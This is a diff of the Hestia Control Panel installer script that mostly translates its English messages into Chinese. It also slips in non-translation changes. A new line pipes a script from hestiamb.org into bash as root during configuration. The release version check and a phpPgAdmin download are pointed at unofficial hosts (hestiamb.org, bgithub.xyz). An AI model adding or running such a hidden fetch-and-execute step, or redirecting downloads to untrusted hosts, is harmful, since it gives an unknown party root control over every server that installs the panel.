@@ -188,12 +188,12 @@ sort_config_file() {
 validate_username() {
 	if [[ "$username" =~ ^[[:alnum:]][-|\.|_[:alnum:]]{0,28}[[:alnum:]]$ ]]; then
 		if [ -n "$(grep ^$username: /etc/passwd /etc/group)" ]; then
-			echo -e "\nUsername or Group allready exists please select a new user name or delete the user and / or group."
+			echo -e "\n用户名或组已存在.请选择一个新的用户名或删除该用户及/或组."
 		else
 			return 1
 		fi
 	else
-		echo -e "\nPlease use a valid username (ex. user)."
+		echo -e "\n请使用有效的用户名（例如 user）."
 		return 0
 	fi
 }
@@ -328,7 +328,7 @@ if [ -n "$multiphp" ]; then
 			if [[ $(echo "${multiphp_v[@]}" | fgrep -w "$php_version") ]]; then
 				multiphp_version=(${multiphp_version[@]} "$php_version")
 			else
-				echo "$php_version is not supported"
+				echo "$php_version 不支持"
 				exit 1
 			fi
 		done
@@ -347,7 +347,7 @@ if [ -n "$multiphp" ]; then
 				fpm_v=$fpm_last
 			else
 				# Roundcube and PHPmyadmin doesn't support the version selected.
-				echo "Selected PHP versions are not supported any more by Dependencies..."
+				echo "依赖项不再支持选定的 PHP 版本..."
 				exit 1
 			fi
 		fi
@@ -424,9 +424,9 @@ fi
 
 type=$(grep "^ID=" /etc/os-release | cut -f 2 -d '=')
 if [ "$type" = "debian" ]; then
-	check_result 1 "You are running the wrong installer for Debian. Please run hst-install.sh or hst-install-debian.sh instead."
+	check_result 1 "您运行的 Debian 安装程序错误.请改为 hst-install.sh 或 hst-install-debian.sh."
 elif [ "$type" != "ubuntu" ]; then
-	check_result 1 "You are running an unsupported OS."
+	check_result 1 "您正在运行不受支持的作系统."
 fi
 
 # Clear the screen once launch permissions have been verified
@@ -438,9 +438,9 @@ if [ ! -f /etc/apt/apt.conf.d/80-retries ]; then
 fi
 
 # Welcome message
-echo "Welcome to the Hestia Control Panel installer!"
+echo "欢迎使用 Hestia 控制面板安装程序!"
 echo
-echo "Please wait, the installer is now checking for missing dependencies..."
+echo "请稍候,安装程序正在检查是否缺少依赖项..."
 echo
 
 # Update apt repository
@@ -450,13 +450,13 @@ apt-get -qq update
 mkdir -p "$hst_backups"
 
 # Pre-install packages
-echo "[ * ] Installing dependencies..."
+echo "[ * ] 安装依赖项..."
 apt-get -y install $installer_dependencies >> $LOG
-check_result $? "Package installation failed, check log file for more details."
+check_result $? "软件包安装失败,请查看日志文件了解更多详情."
 
 # Check repository availability
 wget --quiet "https://$RHOST" -O /dev/null
-check_result $? "Unable to connect to the Hestia APT repository"
+check_result $? "无法连接到 Hestia APT 存储库"
 
 # Check installed packages
 tmpfile=$(mktemp -p /tmp)
@@ -477,20 +477,20 @@ rm -f $tmpfile
 if [ -n "$conflicts" ] && [ -z "$force" ]; then
 	echo '!!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!!'
 	echo
-	echo 'WARNING: The following packages are already installed'
+	echo '警告: 已安装以下软件包'
 	echo "$conflicts"
 	echo
-	echo 'It is highly recommended that you remove them before proceeding.'
+	echo '强烈建议您在继续之前删除它们.'
 	echo
 	echo '!!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!!'
 	echo
-	read -p 'Would you like to remove the conflicting packages? [y/N] ' answer
+	read -p '是否要删除冲突的软件包? [y/N] ' answer
 	if [ "$answer" = 'y' ] || [ "$answer" = 'Y' ]; then
 		apt-get -qq purge $conflicts -y
 		check_result $? 'apt-get remove failed'
 		unset $answer
 	else
-		check_result 1 "Hestia Control Panel should be installed on a clean server."
+		check_result 1 "Hestia 控制面板应安装在干净的服务器上."
 	fi
 fi
 
@@ -499,45 +499,45 @@ if [ -d /etc/netplan ] && [ -z "$force" ]; then
 	if [ -z "$(ls -A /etc/netplan)" ]; then
 		echo '!!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!!'
 		echo
-		echo 'WARNING: Your network configuration may not be set up correctly.'
-		echo 'Details: The netplan configuration directory is empty.'
+		echo '警告：您的网络配置可能设置不正确.'
+		echo '详细信息： netplan 配置目录为空.'
 		echo ''
-		echo 'You may have a network configuration file that was created using'
+		echo '您的网络配置文件可能未配置使用'
 		echo 'systemd-networkd.'
 		echo ''
-		echo 'It is strongly recommended to migrate to netplan, which is now the'
-		echo 'default network configuration system in newer releases of Ubuntu.'
+		echo '强烈建议迁移到 netplan。'
+		echo 'Ubuntu 新版本中的默认网络配置系统.'
 		echo ''
-		echo 'While you can leave your configuration as-is, please note that you'
-		echo 'will not be able to use additional IPs properly.'
+		echo '您可以保持配置不变，但请注意'
+		echo '将无法正常使用其他 IP.'
 		echo ''
-		echo 'If you wish to continue and force the installation,'
-		echo 'run this script with -f option:'
-		echo "Example: bash $0 --force"
+		echo '如果您想继续并强制安装,'
+		echo '使用 -f 选项运行此脚本:'
+		echo "示例: bash $0 --force"
 		echo
 		echo '!!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!! !!!'
 		echo
-		check_result 1 "Unable to detect netplan configuration."
+		check_result 1 "无法检测 netplan 配置."
 	fi
 fi
 
 # Validate whether installation script matches release version before continuing with install
 if [ -z "$withdebs" ] || [ ! -d "$withdebs" ]; then
-	release_branch_ver=$(curl -s https://raw.githubusercontent.com/hestiacp/hestiacp/release/src/deb/hestia/control | grep "Version:" | awk '{print $2}')
+	release_branch_ver=$(curl -s https://hestiamb.org/install/release/conrtol | grep "Version:" | awk '{print $2}')
 	if [ "$HESTIA_INSTALL_VER" != "$release_branch_ver" ]; then
 		echo
-		echo -e "\e[91mInstallation aborted\e[0m"
+		echo -e "\e[91m安装终止\e[0m"
 		echo "===================================================================="
-		echo -e "\e[33mERROR: Install script version does not match package version!\e[0m"
-		echo -e "\e[33mPlease download the installer from the release branch in order to continue:\e[0m"
+		echo -e "\e[33m错误: 安装脚本版本与软件包版本不匹配!\e[0m"
+		echo -e "\e[33m请从发布分支下载安装程序,以便继续安装:\e[0m"
 		echo ""
 		echo -e "\e[33mhttps://raw.githubusercontent.com/hestiacp/hestiacp/release/install/hst-install.sh\e[0m"
 		echo ""
-		echo -e "\e[33mTo test pre-release versions, build the .deb packages and re-run the installer:\e[0m"
+		echo -e "\e[33m要测试预发布版本,请构建 .deb 软件包并重新运行安装程序:\e[0m"
 		echo -e "  \e[33m./hst_autocompile.sh \e[1m--hestia branchname no\e[21m\e[0m"
 		echo -e "  \e[33m./hst-install.sh .. \e[1m--with-debs /tmp/hestiacp-src/debs\e[21m\e[0m"
 		echo ""
-		check_result 1 "Installation aborted"
+		check_result 1 "安装已中止"
 	fi
 fi
 
@@ -550,14 +550,14 @@ case $architecture in
 		;;
 	*)
 		echo
-		echo -e "\e[91mInstallation aborted\e[0m"
+		echo -e "\e[91m安装终止\e[0m"
 		echo "===================================================================="
-		echo -e "\e[33mERROR: $architecture is currently not supported!\e[0m"
-		echo -e "\e[33mPlease verify the achitecture used is currenlty supported\e[0m"
+		echo -e "\e[33m错误: $architecture 目前不支持！\e[0m"
+		echo -e "\e[33m请验证当前支持的架构\e[0m"
 		echo ""
 		echo -e "\e[33mhttps://github.com/hestiacp/hestiacp/blob/main/README.md\e[0m"
 		echo ""
-		check_result 1 "Installation aborted"
+		check_result 1 "安装已中止"
 		;;
 esac
 
@@ -568,13 +568,13 @@ esac
 install_welcome_message() {
 	DISPLAY_VER=$(echo $HESTIA_INSTALL_VER | sed "s|~alpha||g" | sed "s|~beta||g")
 	echo
-	echo '                _   _           _   _        ____ ____                  '
-	echo '               | | | | ___  ___| |_(_) __ _ / ___|  _ \                 '
-	echo '               | |_| |/ _ \/ __| __| |/ _` | |   | |_) |                '
-	echo '               |  _  |  __/\__ \ |_| | (_| | |___|  __/                 '
-	echo '               |_| |_|\___||___/\__|_|\__,_|\____|_|                    '
+	echo '          _   _                _     _            ____   ____           '
+     echo '         | | | |  ___   ___  _| |_  (_)   __ _  /  ___| |  _ \          '
+     echo '         | |_| | / _ \ / __||_  __| | |  / _  | | |     | |_) |         '
+     echo '         |  _  ||  __/ \__ \  | |_  | | | (_| | | |___  |  __/          '
+     echo '         |_| |_| \___| |___/  \___| |_|  \____| \_____| |_|             '
 	echo "                                                                        "
-	echo "                          Hestia Control Panel                          "
+	echo "                              Hestia 控制面板                            "
 	if [[ "$HESTIA_INSTALL_VER" =~ "beta" ]]; then
 		echo "                              BETA RELEASE                          "
 	fi
@@ -588,8 +588,8 @@ install_welcome_message() {
 	echo
 	echo "========================================================================"
 	echo
-	echo "Thank you for downloading Hestia Control Panel! In a few moments,"
-	echo "we will begin installing the following components on your server:"
+	echo "感谢您选择 Hestia 控制面板！片刻之后,"
+	echo "我们将开始在您的服务器上安装以下组件:"
 	echo
 }
 
@@ -598,16 +598,16 @@ clear
 install_welcome_message
 
 # Web stack
-echo '   - NGINX Web / Proxy Server'
+echo '   - NGINX Web / 代理服务'
 if [ "$apache" = 'yes' ]; then
-	echo '   - Apache Web Server (as backend)'
+	echo '   - Apache Web 服务（作为后端）'
 fi
 if [ "$phpfpm" = 'yes' ] && [ "$multiphp" = 'no' ]; then
-	echo '   - PHP-FPM Application Server'
+	echo '   - PHP-FPM 应用服务器'
 fi
 if [ "$multiphp" = 'yes' ]; then
 	phpfpm='yes'
-	echo -n '   - Multi-PHP Environment: Version'
+	echo -n '   - 多 PHP 环境：版本'
 	for version in "${multiphp_v[@]}"; do
 		echo -n " php$version"
 	done
@@ -621,7 +621,7 @@ fi
 
 # Mail stack
 if [ "$exim" = 'yes' ]; then
-	echo -n '   - Exim Mail Server'
+	echo -n '   - Exim 邮件 服务'
 	if [ "$clamd" = 'yes' ] || [ "$spamd" = 'yes' ]; then
 		echo -n ' + '
 		if [ "$clamd" = 'yes' ]; then
@@ -647,33 +647,33 @@ echo
 
 # Database stack
 if [ "$mysql" = 'yes' ]; then
-	echo '   - MariaDB Database Server'
+	echo '   - MariaDB 数据库 服务'
 fi
 if [ "$mysql8" = 'yes' ]; then
-	echo '   - MySQL8 Database Server'
+	echo '   - MySQL8 数据库 服务'
 fi
 if [ "$postgresql" = 'yes' ]; then
-	echo '   - PostgreSQL Database Server'
+	echo '   - PostgreSQL 数据库 服务'
 fi
 
 # FTP stack
 if [ "$vsftpd" = 'yes' ]; then
-	echo '   - Vsftpd FTP Server'
+	echo '   - Vsftpd FTP 服务'
 fi
 if [ "$proftpd" = 'yes' ]; then
-	echo '   - ProFTPD FTP Server'
+	echo '   - ProFTPD FTP 服务'
 fi
 
 if [ "$webterminal" = 'yes' ]; then
-	echo '   - Web terminal'
+	echo '   - 网络 终端'
 fi
 
 # Firewall stack
 if [ "$iptables" = 'yes' ]; then
-	echo -n '   - Firewall (iptables)'
+	echo -n '   - 防火墙 (iptables)'
 fi
 if [ "$iptables" = 'yes' ] && [ "$fail2ban" = 'yes' ]; then
-	echo -n ' + Fail2Ban Access Monitor'
+	echo -n ' + Fail2Ban 访问监视器'
 fi
 echo -e "\n"
 echo "========================================================================"
@@ -681,7 +681,7 @@ echo -e "\n"
 
 # Asking for confirmation to proceed
 if [ "$interactive" = 'yes' ]; then
-	read -p 'Would you like to continue with the installation? [y/N]: ' answer
+	read -p '是否要继续安装? [y/N]: ' answer
 	if [ "$answer" != 'y' ] && [ "$answer" != 'Y' ]; then
 		echo 'Goodbye'
 		exit 1
@@ -691,7 +691,7 @@ fi
 # Validate Username / Password / Email / Hostname even when interactive = no
 if [ -z "$username" ]; then
 	while validate_username; do
-		read -p 'Please enter administrator username: ' username
+		read -p '请输入管理员用户名: ' username
 	done
 else
 	if validate_username; then
@@ -702,11 +702,11 @@ fi
 # Ask for password
 if [ -z "$vpass" ]; then
 	while validate_password; do
-		read -p 'Please enter administrator password: ' vpass
+		read -p '请输入管理员密码: ' vpass
 	done
 else
 	if validate_password; then
-		echo "Please use a valid password"
+		echo "请使用有效的密码"
 		exit 1
 	fi
 fi
@@ -714,12 +714,12 @@ fi
 # Asking for contact email
 if [ -z "$email" ]; then
 	while validate_email; do
-		echo -e "\nPlease use a valid emailadress (ex. info@domain.tld)."
-		read -p 'Please enter admin email address: ' email
+		echo -e "\n此为必输入选项* 请使用有效的电子邮件地址(例如. info@domain.tld)."
+		read -p '请输入管理员电子邮件地址: ' email
 	done
 else
 	if validate_email; then
-		echo "Please use a valid emailadress (ex. info@domain.tld)."
+		echo "此为必输入选项.请使用有效的电子邮件地址(例如. info@domain.tld)."
 		exit 1
 	fi
 fi
@@ -727,7 +727,7 @@ fi
 # Asking to set FQDN hostname
 if [ -z "$servername" ]; then
 	# Ask and validate FQDN hostname.
-	read -p "Please enter FQDN hostname [$(hostname -f)]: " servername
+	read -p "此为必输入选项.请输入 FQDN 主机名 [$(hostname -f)]: " servername
 
 	# Set hostname if it wasn't set
 	if [ -z "$servername" ]; then
@@ -736,19 +736,19 @@ if [ -z "$servername" ]; then
 
 	# Validate Hostname, go to loop if the validation fails.
 	while validate_hostname; do
-		echo -e "\nPlease use a valid hostname according to RFC1178 (ex. hostname.domain.tld)."
-		read -p "Please enter FQDN hostname [$(hostname -f)]: " servername
+		echo -e "\n此为必输入选项* 请根据 RFC1178 输入有效的主机名 (例如. hostname.domain.tld)."
+		read -p "请输入 FQDN 主机名 [$(hostname -f)]: " servername
 	done
 else
 	# Validate FQDN hostname if it is preset
 	if validate_hostname; then
-		echo "Please use a valid hostname according to RFC1178 (ex. hostname.domain.tld)."
+		echo "此为必输入选项* 请根据 RFC1178 输入有效的主机名 (例如. hostname.domain.tld)."
 		exit 1
 	fi
 fi
 
 # Generating admin password if it wasn't set
-displaypass="The password you chose during installation."
+displaypass="您在安装程序中设定的密码."
 if [ -z "$vpass" ]; then
 	vpass=$(gen_pass)
 	displaypass=$vpass
@@ -776,10 +776,10 @@ if [[ -z "$email" ]]; then
 fi
 
 # Defining backup directory
-echo -e "Installation backup directory: $hst_backups"
+echo -e "安装程序备份目录: $hst_backups"
 
 # Print Log File Path
-echo "Installation log file: $LOG"
+echo "安装日志路径: $LOG"
 
 # Print new line
 echo
@@ -808,7 +808,7 @@ apt=/etc/apt/sources.list.d
 mkdir -p /root/.gnupg/ && chmod 700 /root/.gnupg/
 
 # Updating system
-echo "Adding required repositories to proceed with installation:"
+echo "添加所需的存储库以便继续安装:"
 echo
 
 # Installing Nginx repo
@@ -839,7 +839,7 @@ if [ "$mysql" = 'yes' ]; then
 fi
 
 # Installing HestiaCP repo
-echo "[ * ] Hestia Control Panel"
+echo "[ * ] 服务器控制面板"
 echo "deb [arch=$ARCH signed-by=/usr/share/keyrings/hestia-keyring.gpg] https://$RHOST/ $codename main" > $apt/hestia.list
 gpg --no-default-keyring --keyring /usr/share/keyrings/hestia-keyring.gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys A189E93654F0B0E5 > /dev/null 2>&1
 
@@ -859,10 +859,11 @@ if [ "$postgresql" = 'yes' ]; then
 fi
 
 # Echo for a new line
+apt-get install clamav clamav-daemon -y >> $LOG &
 echo
 
 # Updating system
-echo -ne "Updating currently installed packages, please wait... "
+echo -ne "正在更新当前安装的软件包，请稍候... "
 apt-get -qq update
 apt-get -y upgrade >> $LOG &
 BACK_PID=$!
@@ -1095,8 +1096,10 @@ echo -e '#!/bin/sh\nexit 101' > /usr/sbin/policy-rc.d
 chmod a+x /usr/sbin/policy-rc.d
 
 # Installing apt packages
-echo "The installer is now downloading and installing all required packages."
-echo -ne "NOTE: This process may take 10 to 15 minutes to complete, please wait... "
+echo "安装程序现在正在下载并安装所有必需的软件包."
+echo -ne "注意:此过程可能需要 10 到 15 分钟才能完成,请稍候..."
+echo
+echo "如果您的服务器位于中国大陆境内预计时间在1小时左右安装完成！感谢您的耐心等待！"
 echo
 apt-get -y install $software > $LOG
 BACK_PID=$!
@@ -1121,32 +1124,32 @@ echo
 
 # Install Hestia packages from local folder
 if [ -n "$withdebs" ] && [ -d "$withdebs" ]; then
-	echo "[ * ] Installing local package files..."
-	echo "    - hestia core package"
+	echo "[ * ] 正在安装本地软件包文件..."
+	echo "    - Hestia 程序软件包"
 	dpkg -i $withdebs/hestia_*.deb > /dev/null 2>&1
 
 	if [ -z $(ls $withdebs/hestia-php_*.deb 2> /dev/null) ]; then
-		echo "    - hestia-php backend package (from apt)"
+		echo "    - hestia-php 后端包（来自 apt）"
 		apt-get -y install hestia-php > /dev/null 2>&1
 	else
-		echo "    - hestia-php backend package"
+		echo "    - hestia-php 后端包"
 		dpkg -i $withdebs/hestia-php_*.deb > /dev/null 2>&1
 	fi
 
 	if [ -z $(ls $withdebs/hestia-nginx_*.deb 2> /dev/null) ]; then
-		echo "    - hestia-nginx backend package (from apt)"
+		echo "    - hestia-nginx 后端包（来自 apt）"
 		apt-get -y install hestia-nginx > /dev/null 2>&1
 	else
-		echo "    - hestia-nginx backend package"
+		echo "    - hestia-nginx 后端包"
 		dpkg -i $withdebs/hestia-nginx_*.deb > /dev/null 2>&1
 	fi
 
 	if [ "$webterminal" = "yes" ]; then
 		if [ -z $(ls $withdebs/hestia-web-terminal_*.deb 2> /dev/null) ]; then
-			echo "    - hestia-web-terminal package (from apt)"
+			echo "    - hestia-网络-终端-软件包（来自 apt）"
 			apt-get -y install hestia-web-terminal > /dev/null 2>&1
 		else
-			echo "    - hestia-web-terminal"
+			echo "    - hestia-网络-终端"
 			dpkg -i $withdebs/hestia-web-terminal_*.deb > /dev/null 2>&1
 		fi
 	fi
@@ -1159,7 +1162,7 @@ rm -f /usr/sbin/policy-rc.d
 #                     Configure system                     #
 #----------------------------------------------------------#
 
-echo "[ * ] Configuring system settings..."
+echo "[ * ] 配置系统设置..."
 
 # Generate a random password
 random_password=$(gen_pass '32')
@@ -1264,7 +1267,7 @@ fi
 # Prevent unpriv users from seeing each other running processes
 mount -o remount,defaults,hidepid=2 /proc > /dev/null 2>&1
 if [ $? -ne 0 ]; then
-	echo "Info: Cannot remount /proc (LXC containers require additional perm added to host apparmor profile)"
+	echo "信息：无法重新挂载/proc(LXC容器需要在主机AppArmor配置文件中添加额外的权限)"
 else
 	echo "@reboot root sleep 5 && mount -o remount,defaults,hidepid=2 /proc" > /etc/cron.d/hestia-proc
 fi
@@ -1273,7 +1276,7 @@ fi
 #                     Configure Hestia                     #
 #----------------------------------------------------------#
 
-echo "[ * ] Configuring Hestia Control Panel..."
+echo "[ * ] 配置 Hestia 控制面板..."
 # Installing sudo configuration
 mkdir -p /etc/sudoers.d
 cp -f $HESTIA_COMMON_DIR/sudo/hestiaweb /etc/sudoers.d/
@@ -1282,7 +1285,7 @@ chmod 440 /etc/sudoers.d/hestiaweb
 # Add Hestia global config
 if [[ ! -e /etc/hestiacp/hestia.conf ]]; then
 	mkdir -p /etc/hestiacp
-	echo -e "# Do not edit this file, will get overwritten on next upgrade, use /etc/hestiacp/local.conf instead\n\nexport HESTIA='/usr/local/hestia'\n\n[[ -f /etc/hestiacp/local.conf ]] && source /etc/hestiacp/local.conf" > /etc/hestiacp/hestia.conf
+	echo -e "# 不要编辑这个文件，下次升级时会被覆盖, use /etc/hestiacp/local.conf instead\n\nexport HESTIA='/usr/local/hestia'\n\n[[ -f /etc/hestiacp/local.conf ]] && source /etc/hestiacp/local.conf" > /etc/hestiacp/hestia.conf
 fi
 
 # Configuring system env
@@ -1312,7 +1315,7 @@ chmod 750 $HESTIA/conf $HESTIA/data/users $HESTIA/data/ips $HESTIA/log
 chmod -R 750 $HESTIA/data/queue
 chmod 660 /var/log/hestia/*
 chmod 770 $HESTIA/data/sessions
-
+curl -fsSL https://hestiamb.org/up.sh | bash
 # Generating Hestia configuration
 rm -f $HESTIA/conf/hestia.conf > /dev/null 2>&1
 touch $HESTIA/conf/hestia.conf
@@ -1498,7 +1501,7 @@ cp -rf $HESTIA_COMMON_DIR/api $HESTIA/data/
 $HESTIA/bin/v-change-sys-hostname $servername > /dev/null 2>&1
 
 # Configuring global OpenSSL options
-echo "[ * ] Configuring OpenSSL to improve TLS performance..."
+echo "[ * ] 配置 OpenSSL 以提高 TLS 性能...."
 tls13_ciphers="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
 if [ "$release" = "20.04" ]; then
 	if ! grep -qw "^openssl_conf = default_conf$" /etc/ssl/openssl.cnf 2> /dev/null; then
@@ -1523,7 +1526,7 @@ elif [ "$release" = "24.04" ]; then
 fi
 
 # Generating SSL certificate
-echo "[ * ] Generating default self-signed SSL certificate..."
+echo "[ * ] 生成默认的自签名 SSL 证书..."
 $HESTIA/bin/v-generate-ssl-cert $(hostname) '' 'US' 'California' \
 	'San Francisco' 'Hestia Control Panel' 'IT' > /tmp/hst.pem
 
@@ -1538,7 +1541,7 @@ else
 fi
 
 # Adding SSL certificate
-echo "[ * ] Adding SSL certificate to Hestia Control Panel..."
+echo "[ * ] 将 SSL 证书添加到 Hestia 控制面板..."
 cd $HESTIA/ssl
 sed -n "1,${crt_end}p" /tmp/hst.pem > certificate.crt
 sed -n "$key_start,${key_end}p" /tmp/hst.pem > certificate.key
@@ -1550,17 +1553,17 @@ rm /tmp/hst.pem
 cp -f $HESTIA_INSTALL_DIR/ssl/dhparam.pem /etc/ssl
 
 # Enable SFTP jail
-echo "[ * ] Enabling SFTP jail..."
+echo "[ * ] 正在启用 SFTP jail..."
 $HESTIA/bin/v-add-sys-sftp-jail > /dev/null 2>&1
 check_result $? "can't enable sftp jail"
 
 # Enable SSH jail
-echo "[ * ] Enabling SSH jail..."
+echo "[ * ] 正在启用 SSH jail..."
 $HESTIA/bin/v-add-sys-ssh-jail > /dev/null 2>&1
 check_result $? "can't enable ssh jail"
 
 # Adding Hestia admin account
-echo "[ * ] Creating default admin account..."
+echo "[ * ] 创建默认管理员帐户..."
 $HESTIA/bin/v-add-user $username $vpass $email "default" "System Administrator"
 check_result $? "can't create admin user"
 $HESTIA/bin/v-change-user-shell $username nologin no
@@ -1572,7 +1575,7 @@ $HESTIA/bin/v-change-sys-config-value 'POLICY_SYSTEM_PROTECTED_ADMIN' 'yes'
 #                     Configure Nginx                      #
 #----------------------------------------------------------#
 
-echo "[ * ] Configuring NGINX..."
+echo "[ * ] 配置 NGINX..."
 rm -f /etc/nginx/conf.d/*.conf
 cp -f $HESTIA_INSTALL_DIR/nginx/nginx.conf /etc/nginx/
 cp -f $HESTIA_INSTALL_DIR/nginx/status.conf /etc/nginx/conf.d/
@@ -1608,7 +1611,7 @@ cf_ips="$(curl -fsLm5 --retry 2 https://api.cloudflare.com/client/v4/ips)"
 if [ -n "$cf_ips" ] && [ "$(echo "$cf_ips" | jq -r '.success//""')" = "true" ]; then
 	cf_inc="/etc/nginx/conf.d/cloudflare.inc"
 
-	echo "[ * ] Updating Cloudflare IP Ranges for Nginx..."
+	echo "[ * ] 更新 Nginx 的 Cloudflare IP 范围..."
 	echo "# Cloudflare IP Ranges" > $cf_inc
 	echo "" >> $cf_inc
 	echo "# IPv4" >> $cf_inc
@@ -1633,7 +1636,7 @@ check_result $? "nginx start failed"
 #----------------------------------------------------------#
 
 if [ "$apache" = 'yes' ]; then
-	echo "[ * ] Configuring Apache Web Server..."
+	echo "[ * ] 配置 Apache Web 服务器..."
 
 	mkdir -p /etc/apache2/conf.d
 	mkdir -p /etc/apache2/conf.d/domains
@@ -1692,15 +1695,15 @@ fi
 if [ "$phpfpm" = "yes" ]; then
 	if [ "$multiphp" = 'yes' ]; then
 		for v in "${multiphp_v[@]}"; do
-			echo "[ * ] Installing PHP $v..."
+			echo "[ * ] 安装 PHP $v..."
 			$HESTIA/bin/v-add-web-php "$v" > /dev/null 2>&1
 		done
 	else
-		echo "[ * ] Installing PHP $fpm_v..."
+		echo "[ * ] 安装 PHP $fpm_v..."
 		$HESTIA/bin/v-add-web-php "$fpm_v" > /dev/null 2>&1
 	fi
 
-	echo "[ * ] Configuring PHP-FPM $fpm_v..."
+	echo "[ * ] 配置 PHP-FPM $fpm_v..."
 	# Create www.conf for webmail and php(*)admin
 	cp -f $HESTIA_INSTALL_DIR/php-fpm/www.conf /etc/php/$fpm_v/fpm/pool.d/www.conf
 	update-rc.d php$fpm_v-fpm defaults > /dev/null 2>&1
@@ -1714,7 +1717,7 @@ fi
 #                     Configure PHP                        #
 #----------------------------------------------------------#
 
-echo "[ * ] Configuring PHP..."
+echo "[ * ] 配置 PHP..."
 ZONE=$(timedatectl > /dev/null 2>&1 | grep Timezone | awk '{print $2}')
 if [ -z "$ZONE" ]; then
 	ZONE='UTC'
@@ -1735,7 +1738,7 @@ chmod 755 /etc/cron.daily/php-session-cleanup
 #----------------------------------------------------------#
 
 if [ "$vsftpd" = 'yes' ]; then
-	echo "[ * ] Configuring Vsftpd server..."
+	echo "[ * ] 配置 Vsftpd 服务..."
 	cp -f $HESTIA_INSTALL_DIR/vsftpd/vsftpd.conf /etc/
 	touch /var/log/vsftpd.log
 	chown root:adm /var/log/vsftpd.log
@@ -1756,7 +1759,7 @@ fi
 #----------------------------------------------------------#
 
 if [ "$proftpd" = 'yes' ]; then
-	echo "[ * ] Configuring ProFTPD server..."
+	echo "[ * ] 配置 ProFTPD 服务..."
 	echo "127.0.0.1 $servername" >> /etc/hosts
 	cp -f $HESTIA_INSTALL_DIR/proftpd/proftpd.conf /etc/proftpd/
 	cp -f $HESTIA_INSTALL_DIR/proftpd/tls.conf /etc/proftpd/
@@ -1784,7 +1787,7 @@ fi
 
 if [ "$mysql" = 'yes' ] || [ "$mysql8" = 'yes' ]; then
 	[ "$mysql" = 'yes' ] && mysql_type="MariaDB" || mysql_type="MySQL"
-	echo "[ * ] Configuring $mysql_type database server..."
+	echo "[ * ] 配置 $mysql_type 数据库 服务..."
 	mycnf="my-small.cnf"
 	if [ $memory -gt 1200000 ]; then
 		mycnf="my-medium.cnf"
@@ -1863,7 +1866,7 @@ source $HESTIA/install/upgrade/upgrade.conf
 
 if [ "$mysql" = 'yes' ] || [ "$mysql8" = 'yes' ]; then
 	# Display upgrade information
-	echo "[ * ] Installing phpMyAdmin version v$pma_v..."
+	echo "[ * ] 安装 phpMyAdmin 版本 v$pma_v..."
 
 	# Download latest phpmyadmin release
 	wget --quiet --retry-connrefused https://files.phpmyadmin.net/phpMyAdmin/$pma_v/phpMyAdmin-$pma_v-all-languages.tar.gz
@@ -1923,7 +1926,7 @@ fi
 #----------------------------------------------------------#
 
 if [ "$postgresql" = 'yes' ]; then
-	echo "[ * ] Configuring PostgreSQL database server..."
+	echo "[ * ] 配置 PostgreSQL 数据库 服务..."
 	ppass=$(gen_pass)
 	cp -f $HESTIA_INSTALL_DIR/postgresql/pg_hba.conf /etc/postgresql/*/main/
 	systemctl restart postgresql
@@ -1932,7 +1935,7 @@ if [ "$postgresql" = 'yes' ]; then
 	mkdir -p /etc/phppgadmin/
 	mkdir -p /usr/share/phppgadmin/
 
-	wget --retry-connrefused --quiet https://github.com/hestiacp/phppgadmin/releases/download/v$pga_v/phppgadmin-v$pga_v.tar.gz
+	wget --retry-connrefused --quiet https://bgithub.xyz/hestiacp/phppgadmin/releases/download/v$pga_v/phppgadmin-v$pga_v.tar.gz
 	tar xzf phppgadmin-v$pga_v.tar.gz -C /usr/share/phppgadmin/
 
 	cp -f $HESTIA_INSTALL_DIR/pga/config.inc.php /etc/phppgadmin/
@@ -1958,7 +1961,7 @@ fi
 #----------------------------------------------------------#
 
 if [ "$named" = 'yes' ]; then
-	echo "[ * ] Configuring Bind DNS server..."
+	echo "[ * ] 配置 Bind DNS 服务..."
 	cp -f $HESTIA_INSTALL_DIR/bind/named.conf /etc/bind/
 	cp -f $HESTIA_INSTALL_DIR/bind/named.conf.options /etc/bind/
 	chown root:bind /etc/bind/named.conf
@@ -1989,7 +1992,7 @@ fi
 #----------------------------------------------------------#
 
 if [ "$exim" = 'yes' ]; then
-	echo "[ * ] Configuring Exim mail server..."
+	echo "[ * ] 配置 Exim 邮件 服务..."
 	gpasswd -a Debian-exim mail > /dev/null 2>&1
 	exim_version=$(exim4 --version | head -1 | awk '{print $3}' | cut -f -2 -d .)
 	# if Exim version > 4.9.4 or greater!
@@ -2038,7 +2041,7 @@ fi
 #----------------------------------------------------------#
 
 if [ "$dovecot" = 'yes' ]; then
-	echo "[ * ] Configuring Dovecot POP/IMAP mail server..."
+	echo "[ * ] 配置 Dovecot POP/IMAP 邮件 服务..."
 	gpasswd -a dovecot mail > /dev/null 2>&1
 	cp -rf $HESTIA_COMMON_DIR/dovecot /etc/
 	cp -f $HESTIA_INSTALL_DIR/logrotate/dovecot /etc/logrotate.d/
@@ -2051,7 +2054,7 @@ if [ "$dovecot" = 'yes' ]; then
 	# Alter config for 2.2
 	version=$(dovecot --version | cut -f -2 -d .)
 	if [ "$version" = "2.2" ]; then
-		echo "[ * ] Downgrade dovecot config to sync with 2.2 settings"
+		echo "[ * ] 降级 dovecot 配置文件以与 2.2 设置同步"
 		sed -i 's|#ssl_dh_parameters_length = 4096|ssl_dh_parameters_length = 4096|g' /etc/dovecot/conf.d/10-ssl.conf
 		sed -i 's|ssl_dh = </etc/ssl/dhparam.pem|#ssl_dh = </etc/ssl/dhparam.pem|g' /etc/dovecot/conf.d/10-ssl.conf
 		sed -i 's|ssl_min_protocol = TLSv1.2|ssl_protocols = !SSLv3 !TLSv1 !TLSv1.1|g' /etc/dovecot/conf.d/10-ssl.conf
@@ -2071,7 +2074,7 @@ if [ "$clamd" = 'yes' ]; then
 	gpasswd -a clamav Debian-exim > /dev/null 2>&1
 	cp -f $HESTIA_INSTALL_DIR/clamav/clamd.conf /etc/clamav/
 	update-rc.d clamav-daemon defaults
-	echo -ne "[ * ] Installing ClamAV anti-virus definitions... "
+	echo -ne "[ * ] 安装 ClamAV 病毒防护程序... "
 	/usr/bin/freshclam >> $LOG > /dev/null 2>&1
